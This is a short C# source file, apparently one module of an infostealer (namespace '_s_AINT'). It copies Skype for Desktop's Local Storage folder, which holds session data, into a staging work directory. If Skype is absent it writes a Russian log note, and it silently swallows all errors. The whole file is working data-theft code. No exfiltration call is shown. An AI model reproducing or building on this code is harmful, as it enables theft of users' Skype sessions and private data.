using System;
using System.IO;

namespace _s_AINT
{
	class cSkype
	{
		public static void Skype()
		{
			try
			{
				string text = Program.workdir + "\\Skype";
				string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Skype for Desktop\\Local Storage";
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				if (Directory.Exists(text2))
				{
					new DirectoryCopy(text2, text + "\\Local Storage");
					return;
				}
				File.WriteAllText(text + "\\info.txt", "===================================== [LOGS] =====================================" + Environment.NewLine + Environment.NewLine + "Skype не найден на компьютере.");
			}
			catch
			{
			}
		}
	}
}
